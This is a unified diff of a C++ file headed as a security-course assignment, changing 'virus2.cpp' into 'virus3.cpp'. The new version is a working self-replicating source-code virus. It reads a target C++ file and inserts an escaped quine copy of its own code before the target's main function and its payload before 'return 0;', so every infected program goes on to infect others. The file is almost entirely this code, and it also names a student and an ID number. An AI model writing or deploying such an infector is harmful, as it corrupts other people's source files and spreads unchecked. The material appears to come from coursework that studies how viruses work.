@@ -1,70 +1,89 @@
-// COMP3632 Assignment 1 virus2.cpp
+// COMP3632 Assignment 1 virus3.cpp
 // Dhesant Nakka | 20146587
 
 #include <iostream>
 #include <fstream>
+#include <sstream>
 #include <cstring>
 
-std::string code = "// COMP3632 Assignment 1 virus2.cpp\n\
+std::string init = "// COMP3632 Assignment 1 virus3.cpp\n\
 // Dhesant Nakka | 20146587\n\
 \n\
 #include <iostream>\n\
 #include <fstream>\n\
+#include <sstream>\n\
 #include <cstring>\n\
 \n\
-std::string code = \"@@\";\n\
+std::string init = \"\\\n@init\";\n\
+std::string exec = \"\\\n@exec\";\n\
 \n\
 std::string escape_string(std::string in) {\n\
     std::string out;\n\
     \n\
     for (std::size_t i = 0; i < in.size(); ++i) {\n\
-	if (in[i] == '\\\\')\n\
-	    out += \"\\\\\\\\\";\n\
-	else if (in[i] == '\\n')\n\
-	    out += \"\\\\n\\\\\\n\";\n\
-	else if (in[i] == '\\\"')\n\
-	    out += \"\\\\\\\"\";\n\
-	else\n\
-	    out += in[i];\n\
+        if (in[i] == '\\\\')\n\
+            out += \"\\\\\\\\\";\n\
+        else if (in[i] == '\\n')\n\
+            out += \"\\\\n\\\\\\n\";\n\
+        else if (in[i] == '\\\"')\n\
+            out += \"\\\\\\\"\";\n\
+        else\n\
+            out += in[i];\n\
     }\n\
     \n\
     return out;\n\
-}\n\
-\n\
-int main (int argc, char** argv) {\n\
-    // Ensure valid argument\n\
-    if (argc < 1) {\n\
-	std::cout << \"No target specified\" << std::endl;\n\
-	return 1;\n\
+}";
+        
+std::string exec = "    if (argc < 1) {\n\
+        std::cout << \"No target specified\" << std::endl;\n\
+        return 1;\n\
     }\n\
     \n\
     std::cout << \"Opening: \" << argv[1] << std::endl;\n\
     \n\
     std::fstream fs;\n\
+    fs.open(argv[1], std::fstream::in);\n\
+    \n\
+    if (!fs.is_open()) {\n\
+        std::cout << \"File opening failed\" << std::endl;\n\
+        return 1;\n\
+    }\n\
+    \n\
+    std::stringstream ss;\n\
+    ss << fs.rdbuf();\n\
+    \n\
+    fs.close();\n\
+    \n\
     fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\
     \n\
     if (!fs.is_open()) {\n\
-	std::cout << \"File opening failed\" << std::endl;\n\
-	return 1;\n\
+        std::cout << \"File opening failed\" << std::endl;\n\
+        return 1;\n\
     }\n\
     \n\
-    std::size_t pos = code.find(\"@@\");\n\
+    std::string merged(init);\n\
+    std::size_t pos;\n\
+    pos = merged.find(\"@exec\");\n\
+    merged.replace(pos, 5, escape_string(exec));\n\
+    pos = merged.find(\"@init\");\n\
+    merged.replace(pos, 5, escape_string(init));\n\
     \n\
-    std::string token = code.substr(0,pos);\n\
-    \n\
-    fs.write(token.c_str(), token.size());\n\
-    \n\
-    token = escape_string(code);\n\
-    fs.write(token.c_str(), token.size());\n\
-    \n\
-    token = code.substr(pos+2);\n\
-    fs.write(token.c_str(), token.size());\n\
+    std::string readline;\n\
+    while(getline(ss,readline)) {\n\
+        if (readline.find(\"int main(int argc, char** argv) {\") != std::string::npos) {\n\
+            fs << merged << std::endl;\n\
+            fs << readline << std::endl;\n\
+        }\n\
+       else if (readline.find(\"return 0;\") != std::string::npos) {\n\
+           fs << std::endl << exec << std::endl;\n\
+           fs << readline << std::endl;\n\
+       }\n\
+       else\n\
+           fs << readline << std::endl;\n\
+    }\n\
     \n\
     fs.close();\n\
-    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\
-    \n\
-    return 0;\n\
-}";
+    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;";
 
 std::string escape_string(std::string in) {
     std::string out;
@@ -84,7 +103,6 @@ std::string escape_string(std::string in) {
 }
 
 int main (int argc, char** argv) {
-    // Ensure valid argument
     if (argc < 1) {
 	std::cout << "No target specified" << std::endl;
 	return 1;
@@ -93,24 +111,45 @@ int main (int argc, char** argv) {
     std::cout << "Opening: " << argv[1] << std::endl;
     
     std::fstream fs;
+    fs.open(argv[1], std::fstream::in);
+    
+    if (!fs.is_open()) {
+	std::cout << "File opening failed" << std::endl;
+	return 1;
+    }
+
+    std::stringstream ss;
+    ss << fs.rdbuf();
+
+    fs.close();
+    
     fs.open(argv[1], std::fstream::out | std::fstream::trunc);
     
     if (!fs.is_open()) {
 	std::cout << "File opening failed" << std::endl;
 	return 1;
     }
+
+    std::string merged(init);
+    std::size_t pos;
+    pos = merged.find("@exec");
+    merged.replace(pos, 5, escape_string(exec));
+    pos = merged.find("@init");
+    merged.replace(pos, 5, escape_string(init));
     
-    std::size_t pos = code.find("@@");
-    
-    std::string token = code.substr(0,pos);
-    
-    fs.write(token.c_str(), token.size());
-    
-    token = escape_string(code);
-    fs.write(token.c_str(), token.size());
-    
-    token = code.substr(pos+2);
-    fs.write(token.c_str(), token.size());
+    std::string readline;
+    while(getline(ss,readline)) {
+	if (readline.find("int main(int argc, char** argv) {") != std::string::npos) {
+	    fs << merged << std::endl;
+	    fs << readline << std::endl;
+	}
+	else if (readline.find("return 0;") != std::string::npos) {
+	    fs << std::endl << exec << std::endl;
+	    fs << readline << std::endl;
+	}
+	else
+	    fs << readline << std::endl;
+    }
     
     fs.close();
     std::cout << "Attack Successful. Have a nice day!" << std::endl;
